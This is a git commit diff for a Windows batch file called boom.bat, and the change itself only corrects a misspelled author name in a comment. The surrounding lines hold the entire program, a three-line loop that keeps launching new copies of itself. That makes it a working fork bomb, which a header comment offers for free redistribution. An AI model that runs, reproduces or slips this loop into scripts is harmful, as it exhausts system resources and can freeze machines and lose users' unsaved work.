f119230db28ca07658dc5153f60aefcfa562ea57
Cristofer Daniel <ogcristofer@gmail.com>
2017-05-17 13:04:30 -0500

    Update boom.bat

--- boom.bat
+++ boom.bat
@@ -1,4 +1,4 @@
-#This software is written by OGCrsitofer and is publicly available to redistribute.
+#This software is written by OGCristofer and is publicly available to redistribute.
  :s
  start "" %0
  goto s
